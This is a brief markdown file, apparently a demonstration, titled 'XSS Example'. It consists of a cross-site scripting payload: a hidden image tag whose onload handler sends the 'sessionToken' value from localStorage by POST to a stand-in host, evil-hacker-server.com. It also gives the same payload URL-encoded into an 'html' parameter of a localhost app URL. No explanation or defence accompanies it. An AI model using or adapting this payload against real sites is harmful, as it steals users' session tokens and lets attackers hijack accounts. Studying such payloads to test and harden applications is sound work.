# XSS Example

## Payload

```
<img
src="https://i.ytimg.com/vi/5j2LOZH9_oM/maxresdefault.jpg"
style="display: none"
onload="fetch('https:\/\/evil-hacker-server.com', {method: 'POST', body: localStorage.getItem('sessionToken')})"
/>
```

## Full URL with payload URL encoded:

http://localhost:5173/#/home?html=%3Cimg%0Asrc%3D%22https%3A%2F%2Fi.ytimg.com%2Fvi%2F5j2LOZH9_oM%2Fmaxresdefault.jpg%22%0Astyle%3D%22display%3A%20none%22%0Aonload%3D%22fetch%28%27https%3A%5C%2F%5C%2Fevil-hacker-server.com%27%2C%20%7Bmethod%3A%20%27POST%27%2C%20body%3A%20localStorage.getItem%28%27sessionToken%27%29%7D%29%22%0A%2F%3E
